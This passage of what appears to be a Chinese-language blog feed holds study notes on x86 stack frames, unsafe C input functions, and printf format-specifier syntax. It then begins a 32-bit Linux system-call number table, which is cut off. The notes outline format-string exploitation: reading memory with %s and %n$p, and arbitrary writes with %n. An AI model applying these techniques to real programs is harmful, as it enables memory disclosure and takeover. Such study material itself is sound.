栈溢出</h1><p>以32位栈举例：</p><p>初始状态：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> esp---&gt;+-----------------+低地址0x001</span><br><span class="line">        |                 |</span><br><span class="line">        |                 |</span><br><span class="line">        |                 |</span><br><span class="line">ebp---&gt;+-----------------+高地址0x011</span><br></pre></td></tr></table></figure><p>然后我们调用一个函数的过程是：</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">put</span><span class="params">(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span></span></span><br></pre></td></tr></table></figure><ol><li>首先进行参数从右到左依次压栈</li><li>然后将下一条指令的返回地址压入栈</li><li>跳转到执行函数入口</li><li>保存栈帧<code>push %ebp</code>，然后把栈帧切换成新的<code>mov %esp, %ebp</code>，然后再抬高栈顶<code>sub $esp, xx</code></li></ol><p>此时栈的情况如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    esp---&gt;+-----------------+低地址</span><br><span class="line">           |                 |</span><br><span class="line">           |                 |</span><br><span class="line">           |                 |</span><br><span class="line">           |                 |</span><br><span class="line">new ebp--&gt;|                 |</span><br><span class="line">           |    ret_addr     |</span><br><span class="line">           |       1         |</span><br><span class="line">           |       2         |</span><br><span class="line">           |       3         |</span><br><span class="line">old ebp--&gt;+-----------------+高地址0x011</span><br></pre></td></tr></table></figure><p>然后新ebp上面的就是局部变量，下面的是参数。</p><p>然后是出栈</p><ol start="5"><li>保存返回值到%eax</li><li><code>mov %ebp,%esp</code>降低栈顶</li><li><code>pop %ebp</code>恢复栈帧</li><li>返回下一条指令地址<code>ret</code></li></ol><h2 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h2><ul><li>输入<code>gets()</code>直接读取一行，忽略<code>\x00</code></li><li><code>scanf()</code>，不检查长度</li><li>输出<code>sprintf()</code>将格式化后的内容写入缓冲区，但是不检查缓冲区长度</li><li>字符串<code>strcpy()</code>遇到<code>\x00</code>暂停，不检查长度，字符串复制</li><li>字符串<code>strcat()</code>遇到<code>\x00</code>暂停，不检查长度，字符串拼</li></ul><h1 id="0x03-ROP"><a href="#0x03-ROP" class="headerlink" title="0x03 ROP"></a>0x03 ROP</h1><h1 id="0x04-格式化字符串漏洞"><a href="#0x04-格式化字符串漏洞" class="headerlink" title="0x04 格式化字符串漏洞"></a>0x04 格式化字符串漏洞</h1><p>常见的有格式化字符串函数有</p><ul><li>输入<ul><li>scanf</li></ul></li><li>输出</li></ul><table><thead><tr><th>函数</th><th>基本介绍</th></tr></thead><tbody><tr><td>printf</td><td>输出到 stdout</td></tr><tr><td>fprintf</td><td>输出到指定 FILE 流</td></tr><tr><td>vprintf</td><td>根据参数列表格式化输出到 stdout</td></tr><tr><td>vfprintf</td><td>根据参数列表格式化输出到指定 FILE 流</td></tr><tr><td>sprintf</td><td>输出到字符串</td></tr><tr><td>snprintf</td><td>输出指定字节数到字符串</td></tr><tr><td>vsprintf</td><td>根据参数列表格式化输出到字符串</td></tr><tr><td>vsnprintf</td><td>根据参数列表格式化输出指定字节到字符串</td></tr><tr><td>setproctitle</td><td>设置 argv</td></tr><tr><td>syslog</td><td>输出日志</td></tr><tr><td>err, verr, warn, vwarn 等</td><td>。。。</td></tr></tbody></table><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* format, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fprintf</span><span class="params">(FILE* stream, <span class="keyword">const</span> <span class="keyword">char</span>* format, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sprintf</span><span class="params">(<span class="keyword">char</span>* str, <span class="keyword">const</span> <span class="keyword">char</span>* format, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">snprintf</span><span class="params">(<span class="keyword">char</span>* str, <span class="keyword">size_t</span> size, <span class="keyword">const</span> <span class="keyword">char</span>* format, ...)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">10</span>);</span><br></pre></td></tr></table></figure><p><code>%d</code>被称为格式化字符串，占用符用于指明输出的参数值如何格式化。</p><p>占位符的语法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure><p>parameter可以忽略或者为<code>n$</code>，n表示此占位符传入的第几个参数：</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%2$d %1$d\n&quot;</span>,<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 2,1</span></span><br><span class="line"><span class="comment">// 1,2</span></span><br></pre></td></tr></table></figure><p>flag可为0或者多个，主要包含：</p><table><thead><tr><th>flags</th><th>含义</th></tr></thead><tbody><tr><td>+</td><td>总是表示有符号数值的 + 或 - 号，默认忽略正数的符号。仅适用于数值类型。</td></tr><tr><td>空格</td><td>有符号数的输出如果没有正负号或者输出0个字符，则以1个空格作为前缀</td></tr><tr><td>-</td><td>左对齐，默认是右对齐</td></tr><tr><td>#</td><td>对于g与G，不删除尾部0以表示精度；对于f、F、e、E、g、G，总是输出小数点；对于o、x、X，在非0数值前分别输出前缀0、0x和0X，表示数制。</td></tr><tr><td>0</td><td>在宽度选项前，表示用0填充</td></tr></tbody></table><p>field width给出显示数值的最小宽度，若实际位数多于width，则按照实际输出，若小于，则补空格或0。如果域宽为*，则由对应的函数参数的值为当前域宽。</p><p>precision指明输出的最大长度：</p><ul><li>对于d、i、u、x、o的整型数值，指最小数字位数，不足的在左侧补0</li><li>对于a、A、e、E、f、F的浮点数值，指小数点右边显示的位数</li><li>对于g、G的浮点数值，指有效数字的最大位数</li><li>对于s的字符串类型，指输出的字节上限</li><li>如果域宽为*，则由对应的函数参数的值为当前域宽。如果仅给出了小数点，则域宽为0。</li></ul><p>length指出浮点型参数或整型参数的长度：</p><ul><li>hh匹配char的整型参数</li><li>h匹配short的整型参数</li><li>l匹配long的整型参数。对于浮点类型匹配double大小的参数。对于字符串s类型，匹配wchar_t指针参数。对于字符c类型，匹配wint_t类型。</li><li>ll匹配long long的整型参数</li><li>L匹配long double的整型参数</li><li>z匹配size_t的整型参数</li><li>j匹配intmax_t的整型参数</li><li>t匹配ptrdiff_t的整型参数</li></ul><p>type：</p><ul><li><code>d、i</code> 有符号十进制int值</li><li><code>u</code> 十进制unsigned int值</li><li><code>f、F</code> 十进制double值</li><li><code>e、E</code> double值，输出形式为十进制的<code>[-]d.ddd e[+/-]ddd</code></li><li><code>g、G</code> double型数值，根据数值大小自动选f或者e</li><li><code>x、X</code> 十六进制unsigned int值</li><li><code>o</code> 八进制unsigned int值</li><li><code>s</code> 字符串，以<code>\x00</code>结尾</li><li><code>c</code> 一个char类型字符</li><li><code>p</code> void*指针类型</li><li><code>a、A</code> double类型十六进制，<code>[-]0xh.hhhh p±d</code>，指数部分为10进制表示形式</li><li><code>n</code> 把已经成功输出的字符个数写入对应的整形指针参数所指的变量</li><li><code>%</code> 字面值，不接受任何flags, width, precision or length。</li></ul><h2 id="格式化字符串利用方式"><a href="#格式化字符串利用方式" class="headerlink" title="格式化字符串利用方式"></a>格式化字符串利用方式</h2><ol><li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。如果提供了一个不可访问的地址，程序就会崩溃。所以让程序崩溃的最简单方式，就是输入多个%s。</li><li>利用 %n$p来获取对应栈的内存</li><li>利用%n写数据。例如<code>%10$4n</code>就是将4写入偏移10处<strong>指针所指向的地址</strong>。我们可以通过修改偏移10处的地址，达到任意写。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 2021年5月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux系统调用表</title>
      <link href="/2021/05/23/linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/"/>
      <url>/2021/05/23/linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>x86平台32位Linux系统调用号</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_restart_syscall 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit         1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fork         2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_read         3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_write        4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_open         5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_close        6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_waitpid         7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_creat        8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_link         9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unlink      10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve      11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chdir       12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_time        13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mknod       14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chmod       15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lchown      16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_break       17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_oldstat         18</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lseek       19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpid      20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mount       21</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_umount      22</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setuid      23</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getuid      24</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stime       25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ptrace      26</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_alarm       27</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_oldfstat        28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pause       29</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_utime       30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stty        31</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_gtty        32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_access      33</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nice        34</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ftime       35</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sync        36</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kill        37</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rename      38</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mkdir       39</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rmdir       40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup         41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pipe        42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_times       43</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_prof        44</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_brk         45</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setgid      46</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getgid      47</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_signal      48</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_geteuid         49</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getegid         50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_acct        51</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_umount2         52</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lock        53</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioctl       54</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fcntl       55</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mpx         56</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setpgid         57</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ulimit      58</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_oldolduname     59</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_umask       60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chroot      61</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ustat       62</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup2         63</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getppid         64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpgrp         65</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setsid       66</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigaction       67</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sgetmask        68</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ssetmask        69</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setreuid        70</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setregid        71</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigsuspend      72</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigpending      73</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sethostname     74</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setrlimit       75</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getrlimit       76 <span class="comment">/* Back compatible 2Gig limited rlimit */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getrusage       77</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_gettimeofday    78</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_settimeofday    79</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getgroups       80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setgroups       81</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_select      82</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_symlink         83</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_oldlstat        84</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readlink        85</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_uselib      86</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_swapon      87</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_reboot      88</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readdir         89</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mmap        90</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munmap      91</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_truncate        92</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ftruncate       93</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchmod      94</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchown      95</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpriority     96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setpriority     97</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_profil      98</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_statfs      99</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstatfs        100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioperm     101</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socketcall     102</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_syslog    103</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setitimer      104</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getitimer      105</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stat       106</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lstat      107</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstat      108</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_olduname       109</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_iopl       110</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vhangup        111</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_idle       112</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vm86old        113</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_wait4      114</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_swapoff        115</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sysinfo        116</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ipc        117</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsync      118</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigreturn      119</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clone      120</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setdomainname  121</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_uname      122</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_modify_ldt     123</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_adjtimex       124</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mprotect       125</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigprocmask    126</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_create_module  127</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_init_module    128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_delete_module  129</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_kernel_syms130</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_quotactl       131</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpgid        132</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchdir     133</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bdflush        134</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sysfs      135</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_personality    136</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_afs_syscall    137 <span class="comment">/* Syscall for Andrew File System */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setfsuid       138</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setfsgid       139</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR__llseek        140</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getdents       141</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR__newselect     142</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_flock      143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msync      144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readv      145</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_writev     146</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsid     147</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fdatasync      148</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR__sysctl        